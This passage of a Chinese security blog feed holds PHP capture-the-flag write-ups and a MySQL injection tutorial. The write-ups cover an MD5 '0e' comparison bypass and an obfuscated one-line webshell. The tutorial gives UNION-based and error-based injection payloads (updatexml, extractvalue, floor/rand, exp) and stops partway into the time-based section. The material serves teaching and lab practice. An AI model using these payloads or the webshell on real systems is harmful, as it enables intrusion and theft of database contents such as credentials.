可以拿到flag</span><br></pre></td></tr></table></figure><h2 id="PHP代码分析溯源-第2题"><a href="#PHP代码分析溯源-第2题" class="headerlink" title="PHP代码分析溯源(第2题)"></a>PHP代码分析溯源(第2题)</h2><hr><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$a1 = md5(<span class="string">'QNKCDZO'</span>);</span><br><span class="line">$a = @$_POST[<span class="string">'pass'</span>];</span><br><span class="line">$a2 = @md5($a);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($a))&#123;</span><br><span class="line">    <span class="keyword">if</span> ($a != <span class="string">'QNKCDZO'</span> &amp;&amp; $a1 == $a2) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"flag"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert(\'认证错误\');window.location.href=\'/index.html\';&lt;/script&gt;'</span>;&#125;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><font face="黑体" color="white" size="5"><strong>程序分析</strong></font></p><h3 id="MD5加密绕过"><a href="#MD5加密绕过" class="headerlink" title="MD5加密绕过"></a>MD5加密绕过</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$a1 = md5(<span class="string">'QNKCDZO'</span>); <span class="comment">//$a1 = 0e830400451993494058024219903391</span></span><br><span class="line">$a = @$_POST[<span class="string">'pass'</span>];</span><br><span class="line">$a2 = @md5($a); <span class="comment">//$a2 = 通过pass传入数据通过MD5加密后的值</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($a))&#123;</span><br><span class="line">    <span class="keyword">if</span> ($a != <span class="string">'QNKCDZO'</span> &amp;&amp; $a1 == $a2) &#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"flag"</span>;   <span class="comment">//双等号在进行比较时传入的数据(0e……)会作为科学计数法进行运算-&gt;0</span></span><br><span class="line">        <span class="keyword">exit</span>();  <span class="comment">//所以传入一个前面也为0e的md5数据即可得到flag</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert(\'认证错误\');window.location.href=\'/index.html\';&lt;/script&gt;'</span>;&#125;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">总结<span class="number">0</span>e开头的md5未加密数据：</span><br><span class="line">    QNKCDZO</span><br><span class="line">   <span class="number">240610708</span></span><br><span class="line">  aabg7XSs</span><br><span class="line">  s878926199a</span><br><span class="line">    aabC9RqS</span><br></pre></td></tr></table></figure><h2 id="PHP代码分析溯源-第1题"><a href="#PHP代码分析溯源-第1题" class="headerlink" title="PHP代码分析溯源(第1题)"></a>PHP代码分析溯源(第1题)</h2><h3 id="php变种一句话"><a href="#php变种一句话" class="headerlink" title="php变种一句话"></a>php变种一句话</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"> @$_++;</span><br><span class="line"></span><br><span class="line"> $__=(<span class="string">"`"</span>^<span class="string">"?"</span>).(<span class="string">":"</span>^<span class="string">"&#125;"</span>).(<span class="string">"%"</span>^<span class="string">"`"</span>).(<span class="string">"&#123;"</span>^<span class="string">"/"</span>);</span><br><span class="line"></span><br><span class="line"> $___=(<span class="string">"$"</span>^<span class="string">"&#123;"</span>).(<span class="string">"~"</span>^<span class="string">"."</span>).(<span class="string">"/"</span>^<span class="string">"`"</span>).(<span class="string">"-"</span>^<span class="string">"~"</span>).(<span class="string">"("</span>^<span class="string">"|"</span>);</span><br><span class="line"></span><br><span class="line"> $&#123;$__&#125;[!$_]($&#123;$___&#125;[$_]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><font face="黑体" color="white" size="5"><strong>程序分析</strong></font></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"> @$_++; <span class="comment">//未传入数据的变量初始化为0 $_++ -&gt; 1</span></span><br><span class="line"></span><br><span class="line"> $__=(<span class="string">"`"</span>^<span class="string">"?"</span>).(<span class="string">":"</span>^<span class="string">"&#125;"</span>).(<span class="string">"%"</span>^<span class="string">"`"</span>).(<span class="string">"&#123;"</span>^<span class="string">"/"</span>);</span><br><span class="line"></span><br><span class="line"> $___=(<span class="string">"$"</span>^<span class="string">"&#123;"</span>).(<span class="string">"~"</span>^<span class="string">"."</span>).(<span class="string">"/"</span>^<span class="string">"`"</span>).(<span class="string">"-"</span>^<span class="string">"~"</span>).(<span class="string">"("</span>^<span class="string">"|"</span>);</span><br><span class="line"><span class="string">''</span><span class="string">'</span></span><br><span class="line"><span class="string">$__、$___ 通过异或运算最终的结果分别为：_GET、_POST</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">最后构造的一句话为：$&#123;_GET&#125;[!1]($&#123;_POST&#125;[1])</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">传参进行命令执行 0(!1=0)=assert(GET)、1=whoami(POST)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'</span><span class="string">''</span></span><br><span class="line"> $&#123;$__&#125;[!$_]($&#123;$___&#125;[$_]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;墨者学院–WebShell代码分析溯源-第11题&quot;&gt;&lt;a href=&quot;#墨者学院–WebShell代码分析溯源-第11题&quot; class=&quot;headerlink&quot; title=&quot;墨者学院–WebShell代码分析溯源(第11题)&quot;&gt;&lt;/a&gt;墨者学院–WebShell
      
    
    </summary>
    
    
      <category term="php代码审计" scheme="https://13l00m.github.io/categories/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="php" scheme="https://13l00m.github.io/tags/php/"/>
    
      <category term="代码审计" scheme="https://13l00m.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="web安全" scheme="https://13l00m.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>mysql注入漏洞方法及原理整理</title>
    <link href="https://13l00m.github.io/2019/11/28/mysql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%96%B9%E6%B3%95%E5%8F%8A%E5%8E%9F%E7%90%86%E6%95%B4%E7%90%86/"/>
    <id>https://13l00m.github.io/2019/11/28/mysql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%96%B9%E6%B3%95%E5%8F%8A%E5%8E%9F%E7%90%86%E6%95%B4%E7%90%86/</id>
    <published>2019-11-28T01:37:38.000Z</published>
    <updated>2019-11-29T07:19:29.876Z</updated>
    
    <content type="html"><![CDATA[<h1 id="数据库注入漏洞类型整理"><a href="#数据库注入漏洞类型整理" class="headerlink" title="数据库注入漏洞类型整理"></a>数据库注入漏洞类型整理</h1><h2 id="写在开始"><a href="#写在开始" class="headerlink" title="写在开始"></a>写在开始</h2><ul><li>由于不同注入方法确定注入点后的获取相应数据方法相同，这里就统一写在一个地方</li><li>文章内容出现过的函数解释为自己所理解的，并不是最全的函数解释</li><li>最开始的是最详细的也是最基础的，避免重复,后面的只有原理代码和修复方案</li><li>下面说的所有注入他们的注入方法都不是固定的，要根据实际情况进行注入</li></ul><h1 id="sql注入基础"><a href="#sql注入基础" class="headerlink" title="sql注入基础"></a>sql注入基础</h1><h2 id="确定注入点"><a href="#确定注入点" class="headerlink" title="确定注入点"></a>确定注入点</h2><p>在进行黑盒测试的过程中，常用于确定注入点的方法</p><ul><li>and 1=2–+#</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对应的后端代码</span></span><br><span class="line">$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">$sql = <span class="string">"select * from users where id =$id"</span>;</span><br></pre></td></tr></table></figure><p><a href="http://localhost/?id=1" target="_blank" rel="noopener">http://localhost/?id=1</a> 属于正常查询 返回正常页面</p><p><a href="http://localhost/?iid=1" target="_blank" rel="noopener">http://localhost/?iid=1</a> and 1=1 返回正常页面</p><p><a href="http://localhost/?id=1" target="_blank" rel="noopener">http://localhost/?id=1</a> and 1=2 返回错误页面</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">对应后端处理代码生成sql语句:</span><br><span class="line">select * from admin where id=1;</span><br><span class="line">查询失败的sql语句:</span><br><span class="line">select * from admin where id =1 and 1=2;</span><br></pre></td></tr></table></figure><p>原理解释</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">当在sql语句后面添加 and 1=2 / and 1=1 的时候 </span><br><span class="line">其中的 1=1 相当于 True</span><br><span class="line">  1=2 相当于 False</span><br><span class="line">  and 相当于 且</span><br><span class="line">所以 当 and 前面的查询语句成立时 and 1=1 可返回正常内容 and 1=2 则返错误内容</span><br></pre></td></tr></table></figure><p>​        </p><ul><li>‘ </li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对应的后端代码</span></span><br><span class="line">$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">$sql = <span class="string">"select * from users where id='$id'"</span>;</span><br></pre></td></tr></table></figure><p><a href="http://localhost/?id=1" target="_blank" rel="noopener">http://localhost/?id=1</a> 属于正常查询 返回正常页面</p><p><a href="http://localhost/?iid=1&#39;" target="_blank" rel="noopener">http://localhost/?iid=1&#39;</a>  –+返回正常页面</p><p><a href="http://localhost/?id=1&#39;" target="_blank" rel="noopener">http://localhost/?id=1&#39;</a> 返回错误页面</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">对应后端处理代码生成sql语句:</span><br><span class="line">select * from admin where id = &apos;1&apos;</span><br><span class="line">查询失败的sql语句:</span><br><span class="line">select * from admin where id =&apos;1&apos;&apos;</span><br></pre></td></tr></table></figure><p>原理解释</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">当多输入一个单引号(&apos;) 时，最后一个单引号未闭合导致报错</span><br><span class="line">为了进一步判断网站是否存在注入漏洞，通常再单引号后面加注释符(&apos;--+)来注释掉未闭合的单引号</span><br><span class="line">如果返回正常页面，则可以确定注入点</span><br></pre></td></tr></table></figure><h3 id="【解释】为什么加-and-1-1-或-and-1-2-都返回正常界面"><a href="#【解释】为什么加-and-1-1-或-and-1-2-都返回正常界面" class="headerlink" title="【解释】为什么加 and 1=1 或 and 1=2 都返回正常界面"></a>【解释】为什么加 and 1=1 或 and 1=2 都返回正常界面</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sql语言中，字符型与非字符型比较：</span><br><span class="line">如果字符串开始存在整形数据（2admin）则拿出来比较的字符串为2</span><br><span class="line">如果不存在整形数据，默认为0</span><br><span class="line">例子:</span><br><span class="line">select 1=&apos;1admin&apos;; 返回1</span><br><span class="line">select 1=&apos;admin&apos;;  返回0</span><br></pre></td></tr></table></figure><ul><li>“</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对应的后端代码</span></span><br><span class="line">$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">$sql = <span class="string">'select * from users where id="$id"'</span>;</span><br></pre></td></tr></table></figure><p>原理和上述相同，不复述</p><ul><li>‘)</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对应的后端代码</span></span><br><span class="line">$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">$sql = <span class="string">"select * from admin where id =('$id')"</span>;</span><br></pre></td></tr></table></figure><p>原理和上述相同，不复述</p><ul><li>“)</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对应的后端代码</span></span><br><span class="line">$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">$sql = <span class="string">'select * from admin where id =("$id")'</span>;</span><br></pre></td></tr></table></figure><p>原理和上述相同，不复述</p><h3 id="【经验】确定存在注入的情况下，快速判断为上述哪种类型"><a href="#【经验】确定存在注入的情况下，快速判断为上述哪种类型" class="headerlink" title="【经验】确定存在注入的情况下，快速判断为上述哪种类型"></a>【经验】确定存在注入的情况下，快速判断为上述哪种类型</h3><p>在参数后面加 \ 如果存在报错，大多可以爆出该参数的接收类型</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/28/mysql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%96%B9%E6%B3%95%E5%8F%8A%E5%8E%9F%E7%90%86%E6%95%B4%E7%90%86/注入/定位.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>上面说了最基础的确定注入点的方法，下面说一下如何利用漏洞获取数据库里面的信息</p><h2 id="漏洞利用获取数据库信息"><a href="#漏洞利用获取数据库信息" class="headerlink" title="漏洞利用获取数据库信息"></a>漏洞利用获取数据库信息</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、获取字段信息</span><br><span class="line">在参数后面加 order by +一个数字 eg: http://localhost/?id=1 order by 4</span><br><span class="line">这里利用 order by 判断字段数量的原理</span><br><span class="line">order by 在sql语句中用于指定字段列数排序，当输入的字段数大于实际最大字段数时，会产生报错。</span><br><span class="line">所以利用 order by 可以判断某个数据表中的最大字段数</span><br><span class="line">报错信息如下：</span><br><span class="line">Unknown column &apos;11&apos; in &apos;order clause&apos;</span><br><span class="line">2、获取字段相应出现的位置</span><br><span class="line">在第一步中已经获得了一个最大字段数，接下来利用 union select 1,2,3,4……,最大字段数 来判断每个字段相对位置</span><br><span class="line">利用 union select 获取相应信息的原理:</span><br><span class="line">union select 在sql语句中的作用是进行联合查询 例子： 两个数据表，每个数据表有相应的条件在进行数据输出   的过程中可用union select进行两个表的拼接</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from admin where id=1;</span><br><span class="line">+------+----------+----------+</span><br><span class="line">| id   | username | password |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">|    1 | admin    | admin    |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">mysql&gt; select * from testt where id=1;</span><br><span class="line">+------+----------+----------+</span><br><span class="line">| id   | username | password |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">|    1 | testt    | testt    |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">mysql&gt; select * from admin where id=1 union select * from testt;</span><br><span class="line">+------+----------+----------+</span><br><span class="line">| id   | username | password |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">|    1 | admin    | admin    |</span><br><span class="line">|    1 | testt    | testt    |</span><br><span class="line">+------+----------+----------+</span><br><span class="line"></span><br><span class="line">因为两个数据表的字段最大值相同，所以会正常输出，如果不同则会报错(如下)</span><br><span class="line">The used SELECT statements have a different number of columns</span><br><span class="line">union select 不仅仅能拼接字段相同的表，还可以拼接字段相同的任意数据</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from admin where id=1 union select 1,2,3;</span><br><span class="line">+------+----------+----------+</span><br><span class="line">| id   | username | password |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">|    1 | admin    | admin    |</span><br><span class="line">|    1 | 2        | 3        |</span><br><span class="line">+------+----------+----------+</span><br><span class="line"></span><br><span class="line">当把sql语句输入到网站参数后面：http://localhost/?id=1 union select 1,2,3时</span><br><span class="line">该网站后端程序仍返回正常数据</span><br><span class="line">原因：就像上述表的查询相同，前后两个查询条件都为True，id=1的条件成立，所以网站返回正常内容，当构造的   id！=True时，数据表返回的内容只有 union select 之后的数据</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from admin where id=-1 union select 1,2,3;</span><br><span class="line">+------+----------+----------+</span><br><span class="line">| id   | username | password |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">|    1 | 2        | 3        |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">当网页参数构造的id为False（-1） 则返回的内容为union select 进行拼接的内容</span><br><span class="line">如：http://localhost/?id=-1 union select 1,2,3 返回值为 2</span><br><span class="line">说明 username 这个字段在第二个位置，且 可以利用这个字段获取数据库里面的所有信息</span><br><span class="line"></span><br><span class="line">3、获取当前的数据库名、数据库版本信息、数据库当前用户等</span><br><span class="line">利用第二步拼接语句 union select</span><br><span class="line">获取db名 http://localhost/?id=-1 union select 1,database(),3</span><br><span class="line">获取db版本信息 http://localhost/?id=-1 union select 1,version(),3</span><br><span class="line">获取db当前用户 http://localhost/?id=-1 union select 1,user(),3</span><br><span class="line">database(),version(),user() 都是数据库里面的内置函数，想进一步了解去百度</span><br><span class="line"></span><br><span class="line">这里解释一下，为什么这些函数不放在1和3这两个位置：</span><br><span class="line">因为第二步中的 union select 1,2,3 网页回显的信息只有2字段的数据信息，所以在进行获取数据的过程中，只能利用2这个位置，实战中选择一个可以回显的数据字段即可，没有固定要求 </span><br><span class="line"></span><br><span class="line">4、获取所有数据库名（限制mysql版本&gt;=5.0）</span><br><span class="line">sql语句：</span><br><span class="line">select group_concat(schema_name) from information_schema.schemata;</span><br><span class="line">解释为什么用 group_concat():</span><br><span class="line">正常情况下查询出来的数据不止有一行，所以需要group_concat把多行数据拼接到一行里面</span><br><span class="line">limit 可以替换 group_concat()</span><br><span class="line">sql语言中的limit可以控制输出 limit 参数1,参数2</span><br><span class="line">参数2 表示输出几行数据</span><br><span class="line">参数1 表示输出第几块数据（块分多少由参数2控制）</span><br><span class="line">所以相应的sql语句可以写为：</span><br><span class="line">select schema_name from information_schema.schemata limit 0,1</span><br><span class="line">from 的作用</span><br><span class="line">from的作用也就是他的直译来自(哪个数据库)</span><br><span class="line">from information_schema 就是选择 information_schema 这个数据库</span><br><span class="line">. 的作用</span><br><span class="line">information_schema.schemata中的 . 就是 information_schema 下的一个表</span><br><span class="line">information_schema 与 schemata 可理解为父子关系</span><br><span class="line"></span><br><span class="line">一定要注意 information_schema 只有mysql版本&gt;=5.0才有，若小于这个版本，只能利用最基本的方法获取数据</span><br><span class="line"></span><br><span class="line">5、获取当前数据库所有表名</span><br><span class="line">sql语句:</span><br><span class="line">select group_concat(table_name) from information_schema.tables where table_schema=&apos;数据库名&apos;;</span><br><span class="line"></span><br><span class="line">where的作用是查询的条件，table_schema 为该表其中一个字段名不必深究为什么写这个（背背背）</span><br><span class="line"></span><br><span class="line">其他的跟第四步重复，不再复述</span><br><span class="line"></span><br><span class="line">6、获取表的字段名</span><br><span class="line">sql语句:</span><br><span class="line">select group_concat(column_name) from information_schema.columns where table_name=&apos;表名&apos;;</span><br><span class="line"></span><br><span class="line">7、获取字段信息</span><br><span class="line">sql语句：</span><br><span class="line">select group_concat(字段1，字段2，字段3) from 数据库名.表名</span><br><span class="line"></span><br><span class="line">这就是一套比较基础 完整的sql注入漏洞利用方法及过程</span><br></pre></td></tr></table></figure><h2 id="常见的sql注入漏洞类型"><a href="#常见的sql注入漏洞类型" class="headerlink" title="常见的sql注入漏洞类型"></a>常见的sql注入漏洞类型</h2><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><h4 id="updatexml-函数报错注入"><a href="#updatexml-函数报错注入" class="headerlink" title="updatexml()函数报错注入"></a>updatexml()函数报错注入</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UPDATEXML(XML_document, XPath_string, new_value); </span><br><span class="line"> </span><br><span class="line">第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc </span><br><span class="line"></span><br><span class="line">第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。 </span><br><span class="line"></span><br><span class="line">第三个参数：new_value，String格式，替换查找到的符合条件的数据 </span><br><span class="line"></span><br><span class="line">作用：改变文档中符合条件的节点的值 </span><br><span class="line"></span><br><span class="line">报错原理：Xpath格式语法书写错误的话，就会报错</span><br></pre></td></tr></table></figure><p><a href="http://www.360doc.com/content/19/0515/11/2322_835832021.shtml" target="_blank" rel="noopener">更好的理解updatexml</a></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">updatexml的第二个参数相当于正常sql语句中的from where，都可以从大量数据中提取出特定想要的数据，我猜测这就是可以能够执行sql语句的原因（为什么能够执行sql语句我也不清楚，可能需要查看底层源码才能知晓）</span><br><span class="line"></span><br><span class="line">如何获取数据库里面的信息呢</span><br><span class="line">select updatexml(1,concat(0x7e,database()),1)</span><br><span class="line">concat() 用于拼接输出结果</span><br><span class="line">select concat(1,2) -&gt; 输出结果为：12</span><br><span class="line">这里为了在实战中方便找到返回的数据用了 concat()。真实情况写不写都可以返回数据，不是一成不变的死格式</span><br><span class="line">0x7e为 ~ 的十六进制</span><br><span class="line">sql语言在查询过程中可用想查询字符串的十六进制带替字符串，避免单、双引号混乱造成程序问题</span><br><span class="line"></span><br><span class="line">上面已经获取到库名，该如何获取其他数据上面已经说的很详细了，这里不复述</span><br></pre></td></tr></table></figure><h4 id="extractvalue-函数报错注入"><a href="#extractvalue-函数报错注入" class="headerlink" title="extractvalue()函数报错注入"></a>extractvalue()函数报错注入</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Extractvalue(xml_frag,xpath_expr)</span><br><span class="line"></span><br><span class="line">xml_frag: 目标xml文档</span><br><span class="line"></span><br><span class="line">xpath_expr: 利用Xpath路径法表示的查找路径</span><br><span class="line"></span><br><span class="line">报错原理：Xpath格式语法书写错误的话，就会报错</span><br><span class="line"></span><br><span class="line">因为extractvalue()与updatexml()都是对xml文件进行操作，通过报错获取数据的原理相似，这里不再复述</span><br><span class="line"></span><br><span class="line">简单说一下如何构造sql语句进行获取数据库信息</span><br><span class="line"></span><br><span class="line">select extractvalue(1,concat(0x7e,database()));</span><br></pre></td></tr></table></figure><h4 id="floor-函数报错注入"><a href="#floor-函数报错注入" class="headerlink" title="floor()函数报错注入"></a>floor()函数报错注入</h4><p><a href="https://mp.weixin.qq.com/s?__biz=MzA5NDY0OTQ0Mw==&mid=403404979&idx=1&sn=27d10b6da357d72304086311cefd573e&scene=1&srcid=04131X3lQlrDMYOCntCqWf6n#wechat_redirect" target="_blank" rel="noopener">Mysql报错注入原理分析(count()、rand()、group by)</a></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">获取数据库:</span><br><span class="line"></span><br><span class="line">select 1,2,3 from (select count(*),concat((select  concat(version(),0x3a,0x3a,database(),0x3a,0x3a,user(),0x3a) limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a</span><br><span class="line"></span><br><span class="line">语句中的floor(rand(0)*2)是什么意思？是为了产生一个不唯一的且能会出现重复的数字。rand()函数产生的数会随机   产生0到1的小数，而加上参数变成rand(0)的时候，会产生一个确定的小数（我的理解）</span><br><span class="line"></span><br><span class="line">所以，rand(0)是为了得到一个确定的数，也就是执行第几次就是什么数据（我自己的理解），而*2再floor是为了得到唯一的整数数据,将floor得到的数据范围限定在[0,1]之间</span><br><span class="line"></span><br><span class="line">再说报错，报了什么错呢，是主键重复，为什么会主键重复呢?这就group by 和 count(*)有关了，我们先看count(*) 和group by组合一起的效果</span><br><span class="line"></span><br><span class="line">结果会显示每个列的次数，而这个列的内容，是唯一的主键。而在查询过程中，是先建立一张虚拟表，一行一行插入的， 而插入时已经有重复主键了，那么，就会报错。当然，可能会问了，重复时，count(*)就加1了，为什么会主键重复呢？  这就和rand()函数有关了，官方文档中提到，rand()函数在进行GROUP BY查询时会被计算多次，这里列举参考文档的解释,我觉得说的很清楚：</span><br><span class="line"></span><br><span class="line">1.查询前默认会建立空虚拟表</span><br><span class="line"></span><br><span class="line">2.取第一条记录，执行floor(rand(0)*2)，发现结果为0(第一次计算),查询虚拟表，发现0的键值不存在，则floor(rand(0)*2)会被再计算一次，结果为1(第二次计算)，插入虚表，这时第一条记录查询完毕</span><br><span class="line"></span><br><span class="line">3.查询第二条记录，再次计算floor(rand(0)*2)，发现结果为1(第三次计算)，查询虚表，发现1的键值存在，所以floor(rand(0)*2)不会被计算第二次，直接count(*)加1，第二条记录查询完毕</span><br><span class="line"></span><br><span class="line">4.查询第三条记录，再次计算floor(rand(0)*2)，发现结果为0(第4次计算)，查询虚表，发现键值没有0，则数据库尝试插入一条新的数据，在插入数据时floor(rand(0)*2)被再次计算，作为虚表的主键，其值为1(第5次计算)，然而1这个   主键已经存在于虚拟表中，而新计算的值也为1(主键键值必须唯一)，所以插入的时候就直接报错了。</span><br><span class="line"></span><br><span class="line">5.整个查询过程floor(rand(0)*2)被计算了5次，查询原数据表3次，所以这就是为什么数据表中需要3条数据，使用该语   句才会报错的原因。</span><br><span class="line"></span><br><span class="line">获取表名:</span><br><span class="line">select 1,2,3 from (select count(*),concat((select concat(table_name,0x3a,0x3a) from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a</span><br><span class="line"></span><br><span class="line">获取表内容：</span><br><span class="line">select 1,2,3 from (select count(*),concat((select concat(username,0x3a, 0x3a,password,0x3a, 0x3a)   from security.users limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">待补充（有点难懂）</span><br></pre></td></tr></table></figure><p>常用的为前三种，下面的稍微点一下</p><p>当mysql版本大于5.5.53时，下面出现的函数无法继续利用其进行报错注入</p><h4 id="geometrycollection"><a href="#geometrycollection" class="headerlink" title="geometrycollection()"></a>geometrycollection()</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure><h4 id="multipoint"><a href="#multipoint" class="headerlink" title="multipoint()"></a><strong>multipoint()</strong></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from admin where id=1 and multipoint((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure><h4 id="polygon"><a href="#polygon" class="headerlink" title="polygon()"></a>polygon()</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from test where id=1 and polygon((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure><h4 id="multipolygon"><a href="#multipolygon" class="headerlink" title="multipolygon()"></a><strong>multipolygon()</strong></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure><h4 id="linestring"><a href="#linestring" class="headerlink" title="linestring()"></a><strong>linestring()</strong></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from test where id=1 and linestring((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure><h4 id="multilinestring"><a href="#multilinestring" class="headerlink" title="multilinestring()"></a><strong>multilinestring()</strong></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure><h4 id="exp"><a href="#exp" class="headerlink" title="exp()"></a><strong>exp()</strong></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from test where id=1 and exp(~(select * from(select user())a));</span><br></pre></td></tr></table></figure><h4 id="NAME-CONST-函数报错注入（mysql版本-lt-5-1）"><a href="#NAME-CONST-函数报错注入（mysql版本-lt-5-1）" class="headerlink" title="NAME_CONST()函数报错注入（mysql版本&lt;5.1）"></a>NAME_CONST()函数报错注入（mysql版本&lt;5.1）</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在mysql中，列名重复会报错，所以name_const()函数就是利用这一特性，重新定义一个重复的列名来让数据库报错。</span><br><span class="line"></span><br><span class="line">定义重复列名报错语句：</span><br><span class="line"></span><br><span class="line">select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;</span><br></pre></td></tr></table></figure><h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><h4 id="什么是延时注入"><a href="#什么是延时注入" class="headerlink" title="什么是延时注入"></a>什么是延时注入</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在讲什么是延时注入之前呢，要先说一下为什么要用延时注入</span><br><span class="line">之前存在sql注入漏洞的网站呢，你随便加个单引或双引就会报错，闭合方式也很好找。经过这几年痛苦的sql注入的磨练，他们变机灵了……能够报错的网站程序越来越少，甚至有些存在注入点的网站不管加单引或双引他都会给你返回一个正  常页面。所以呢，我们也进化了……出现了一个让sql命令执行成功的标志——sleep(),因为这个函数正常执行后能够让网站    出现延迟，比较直观</span><br><span class="line">什么是延时注入：</span><br><span class="line">我上面一大堆不就讲的这个？</span><br></pre></td></tr></table></figure><h4 id="延时注入出现场景"><a href="#延时注入出现场景" class="headerlink" title="延时注入出现场景"></a>延时注入出现场景</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、确定存在注入点，且找到闭合方式</span><br><span class="line">2、用上述所有获取信息的sql语句无效（无回显数据）</span><br><span class="line">3、sleep函数未被禁用</span><br><span class="line">4、等我想起来再补充</span><br></pre></td></tr></table></figure><h4 id="涉及到的函数介绍及利用"><a href="#涉及到的函数介绍及利用" class="headerlink" title="涉及到的函数介绍及利用"></a>涉及到的函数介绍及利用</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">延时注入最常用的组合拳：（不含过滤的情况）</span><br><span class="line"></span><br><span class="line">sleep() if() substr() ascii() length()</span><br><span class="line"></span><br><span class="line">接下来简单解释一下各个函数的作用</span><br><span class="line"></span><br><span class="line">sleep(num)</span><br><span class="line"></span><br><span class="line">使用sleep函数可以延长sql语句执行时间:select * from table_name where column_name=ST and sleep(N) 